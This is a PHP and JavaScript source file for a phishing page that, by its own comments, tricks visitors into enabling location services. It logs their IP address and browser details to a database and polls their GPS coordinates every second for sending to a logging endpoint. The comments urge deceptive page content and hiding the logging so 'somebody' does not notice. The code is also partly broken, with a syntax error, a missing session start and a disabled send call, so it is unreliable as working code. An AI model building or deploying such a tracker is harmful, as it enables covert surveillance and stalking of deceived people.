<?php
	// As soon as someone opens the page, open a session, then add them to the 'devices' table
	require 'device_model.php';

	if (!isset($_SESSION['token'])) { // If the user doesn't already have a session, give them one and add them to the database
		// Create session variable
		$_SESSION['token'] = random_str(45); // Length of 45 chars, default alphanumeric keyspace
		$time =  date("Y-m-d H:i:s"); // We need to pass a variable to bindParam for futureproofing reasons
		$device = new Device(0, $_SESSION['token'], $_SESSION['HTTP_USER_AGENT'], $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_X_FORWARDED_FOR'], $time); // Pass an ID of zero and have MySQL set it automatically
		if ($device->Save()) {
			$color = "green";
			$message = "Success!";
		} else {
			$color = "red";
			$message = "Nope"
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
<!-- The basis for this JS is the part I heartlessly stole from DemmSec - props to those guys for being fantastic -->
<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script> <!-- jQuery -->
<script type="text/javascript">
var token = "<?php echo $_SESSION['token'] ?>"; // We need this on the client side so we can send it with the request in order to identify ourselves
function httpGet(url) { // This should be done as POST to follow proper HTTP etiquette
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open("GET", url, false); // False means synchronous
	xmlHttp.send(null);
	return xmlHttp.responseText;

	// Rewrite in jQuery.get()?
	//$.get(url, function(data){
	//	
	//});
}

function autoUpdate() {
	navigator.geolocation.getCurrentPosition(function(position) {
		coords = position.coords.latitude + "," + position.coords.longitude;
		url = "/logme/logme.php?";
		//httpGet(url);
		console.log("Works! Coords: " + coords); // Keep this commented out in production, somebody might notice
		setTimeout(autoUpdate, 1000);
	});
}

$(document).ready(function() {
		autoUpdate();
		console.log(token);
});
</script>
</head>
<body>
	<!-- Add your phishing page here to try and convince the user to allow location -->
	<h1>Turn on location services</h1>
	<h2 style="color: <?php echo $color ?>"><?php echo $message ?></h2>
</body>
</html>
